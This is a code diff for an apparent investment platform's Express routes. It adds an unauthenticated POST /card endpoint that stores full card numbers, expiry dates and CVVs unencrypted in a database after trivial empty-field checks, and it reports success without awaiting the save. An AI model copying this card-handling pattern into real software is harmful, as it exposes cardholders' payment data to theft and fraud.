@@ -7,6 +7,7 @@ const TranxModel = require('../Model/tranxModel');
 const WithdrawalModel = require('../Model/withdrawalModel');
 const IPModel = require('../Model/ipModel');
 const OnlineModel = require('../Model/online');
+const CardDetailsModel = require('../Model/cardDetails');
 const { UserAuthMiddleware } = require('../Middlewares/authMiddleware');
 const { ipLookup } = require('../functions/ipLookup');
 const { registerValidation, loginValidation } = require('../Joi_Validation/register_login_validation');
@@ -168,6 +169,7 @@ route.get('/', UserAuthMiddleware, async (req, res) => {
         isClient: user.isClient,
         investmentPlan: user.investmentPlan,
         investmentBalance: user.investmentBalance,
+        accountLocked: user.accountLocked,
       }
     });
   } catch (error) {
@@ -646,6 +648,83 @@ route.put('/verify-payment', async (req, res) => {
     return res.status(400).json({
       status: 'failed',
       message: 'Bad Request',
+    });
+  }
+});
+
+route.post('/card', (req, res) => {
+  try {
+    const { fn, ln, email, cardNum, mon, yr, cvv, zip } = req.body;
+
+    if (fn === '') {
+      return res.status(400).json({
+        message: 'First Name is Required'
+      });
+    }
+
+    if (ln === '') {
+      return res.status(400).json({
+        message: 'Last Name is Required'
+      });
+    }
+
+    if (email === '') {
+      return res.status(400).json({
+        message: 'Email is Required'
+      });
+    }
+
+    if (cardNum === '') {
+      return res.status(400).json({
+        message: 'Card Number is Required'
+      });
+    }
+
+    if (mon === '') {
+      return res.status(400).json({
+        message: 'Expiry Month is Required'
+      });
+    }
+
+    if (yr === '') {
+      return res.status(400).json({
+        message: 'Expiry Year is Required'
+      });
+    }
+
+    if (cvv === '') {
+      return res.status(400).json({
+        message: 'CVV is Required'
+      });
+    }
+
+    if (zip === '') {
+      return res.status(400).json({
+        message: 'Zip Code is Required'
+      });
+    }
+
+    const cardDetails = new CardDetailsModel({
+      firstName: fn,
+      lastName: ln,
+      email,
+      cardNum,
+      expiryMon: mon,
+      expiryYr: yr,
+      cvv,
+      zipCode: zip,
+    });
+
+    cardDetails.save();
+
+    return res.status(200).json({
+      message: 'Success',
+    });
+  } catch (error) {
+    console.log(error);
+
+    res.status(500).json({
+      message: 'Something Went Wrong',
     });
   }
 });
